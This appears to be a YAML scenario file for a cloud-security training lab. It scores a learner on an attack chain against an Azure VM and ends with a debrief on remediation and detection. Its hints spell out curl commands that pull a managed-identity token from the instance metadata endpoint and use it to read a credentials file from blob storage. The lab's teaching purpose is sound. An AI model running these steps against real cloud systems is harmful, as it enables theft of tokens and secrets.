objectives:
  - id: discover_imds
    description: "Discover and probe the IMDS endpoint"
    trigger: "regex:curl.*169\\.254\\.169\\.254.*Metadata.*true"
    points: 50
    order: 1

  - id: get_instance_metadata
    description: "Retrieve VM instance metadata"
    trigger: "regex:curl.*169\\.254\\.169\\.254.*/metadata/instance"
    points: 75
    order: 2

  - id: extract_token
    description: "Extract the managed identity access token"
    trigger: "regex:curl.*169\\.254\\.169\\.254.*/metadata/identity/oauth2/token"
    points: 125
    order: 3

  - id: use_token_storage
    description: "Use the stolen token to access protected storage"
    trigger: "regex:curl.*contosobackups2024\\.blob\\.core\\.windows\\.net.*Authorization.*Bearer"
    points: 150
    order: 4

hints:
  - objective_id: discover_imds
    level: 1
    text: "Azure VMs can reach IMDS at 169.254.169.254. All requests require a special header."
    point_cost: 10

  - objective_id: discover_imds
    level: 2
    text: "Try: curl -H 'Metadata: true' 'http://169.254.169.254/metadata/'"
    point_cost: 25

  - objective_id: get_instance_metadata
    level: 1
    text: "The /metadata/instance endpoint reveals VM details. Include api-version parameter."
    point_cost: 15

  - objective_id: get_instance_metadata
    level: 2
    text: "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
    point_cost: 35

  - objective_id: extract_token
    level: 1
    text: "Managed identity tokens are obtained from /metadata/identity/oauth2/token. Specify the resource."
    point_cost: 20

  - objective_id: extract_token
    level: 2
    text: "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'"
    point_cost: 50

  - objective_id: use_token_storage
    level: 1
    text: "Use the access_token with an Authorization: Bearer header. Azure Storage also requires x-ms-version header."
    point_cost: 25

  - objective_id: use_token_storage
    level: 2
    text: "curl -H 'Authorization: Bearer <TOKEN>' -H 'x-ms-version: 2020-04-08' 'https://contosobackups2024.blob.core.windows.net/application-secrets/database-credentials.json'"
    point_cost: 75

debrief: |
  === MISSION DEBRIEF ===

  VULNERABILITY IDENTIFIED: Managed Identity Token Theft via IMDS

  FINDINGS:
  You successfully demonstrated how an attacker with VM access can abuse the
  Instance Metadata Service to steal managed identity tokens and access
  Azure resources.

  ATTACK CHAIN:
  1. Discovered IMDS endpoint at 169.254.169.254
  2. Retrieved VM metadata revealing identity configuration
  3. Extracted OAuth token for the managed identity
  4. Used token to authenticate to Azure Storage
  5. Accessed sensitive secrets in protected containers

  IMPACT:
  - Database credentials for production and staging exposed
  - Third-party API keys (Stripe, SendGrid, Twilio) compromised
  - Potential for lateral movement using extracted credentials
  - Full read access to all data the managed identity can access

  ROOT CAUSE:
  - Overly permissive managed identity permissions (Storage Blob Data Contributor)
  - Sensitive secrets stored in blob storage accessible to application identities
  - No additional network restrictions on IMDS access

  REMEDIATION RECOMMENDATIONS:
  1. Apply principle of least privilege to managed identity permissions
  2. Use Azure Key Vault instead of blob storage for secrets
  3. Implement Azure Policy to restrict IMDS access if not needed
  4. Enable NSG flow logs and monitor for IMDS access patterns
  5. Use customer-managed keys for storage encryption
  6. Implement conditional access policies for token usage
  7. Consider using private endpoints for storage accounts

  DETECTION STRATEGIES:
  - Monitor for unusual IMDS token requests in Azure Activity logs
  - Alert on storage access from unexpected identities
  - Implement anomaly detection for managed identity usage patterns
  - Review identity permissions regularly using Entra ID access reviews

  AZURE SECURITY BEST PRACTICES:
  - Store secrets in Azure Key Vault, not blob storage
  - Use Azure RBAC with minimal permissions
  - Enable Microsoft Defender for Cloud workload protection
  - Implement network segmentation and private endpoints
  - Regular security assessments of managed identity permissions

  Great work demonstrating this attack path!
